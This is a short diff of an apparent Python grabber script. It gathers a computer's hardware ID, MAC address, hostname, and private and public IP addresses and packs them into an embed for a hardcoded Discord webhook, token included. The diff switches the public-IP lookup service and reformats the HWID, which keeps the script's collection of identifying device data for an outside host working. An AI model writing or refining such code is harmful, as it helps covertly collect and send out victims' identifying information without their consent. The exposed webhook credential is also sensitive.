@@ -9,7 +9,7 @@ hwid = uuid.getnode()
 mac_address = ':'.join(['{:02x}'.format((hwid >> i) & 0xff) for i in range(0, 48, 8)])
 computer_name = socket.gethostname()
 private_ip = socket.gethostbyname(socket.gethostname())
-public_ip = requests.get('https://api.ipify.org').text
+public_ip = requests.get('https://ifconfig.me/ip').text.strip()
 webhook_url = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
 
 embed = {
@@ -24,7 +24,7 @@ embed = {
         },
         {
             "name": "Device Details",
-            "value": f"HWID: {hwid}\nMAC Address: {mac_address}",
+            "value": f"HWID: {hex(hwid)}\nMAC Address: {mac_address}",
             "inline": False
         }
     ],
